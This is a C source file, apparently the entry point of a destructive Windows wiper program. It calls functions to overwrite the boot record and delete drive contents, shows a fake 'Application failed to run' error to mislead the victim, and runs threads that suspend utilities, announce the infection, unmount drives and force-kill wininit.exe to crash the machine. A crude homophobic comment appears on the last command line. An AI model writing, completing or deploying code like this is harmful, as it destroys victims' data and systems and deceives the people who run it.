#include "przejebane.h"

INT
WINAPI
wWinMain(
	_In_     HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_     WCHAR*    szCmdLine,
	_In_     INT       nShowCmd
)
{
	UNREFERENCED_PARAMETER( hInstance );
	UNREFERENCED_PARAMETER( hPrevInstance );

	OverwriteBoot( );
	MessageBoxW( NULL, L"Application failed to run.", L"Error", MB_OK | MB_ICONERROR );
	Sleep( 10000 );

	// Begin all the features
	DriveDelete( );

	CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )SuspendUtils, NULL, 0, NULL );
	CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )AnnounceInfection, NULL, 0, NULL );

	Sleep( 80000 ); 

	CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )EndMessage, NULL, 0, NULL );
	CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )KillPayload, NULL, 0, NULL );
	Sleep( 5000 );

	CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )UnmountDrives, NULL, 0, NULL );
	ShellExecuteW( NULL, 0, L"taskkill", L"/f /im wininit.exe", NULL, SW_HIDE ); // Gay
	Sleep( INFINITE );
}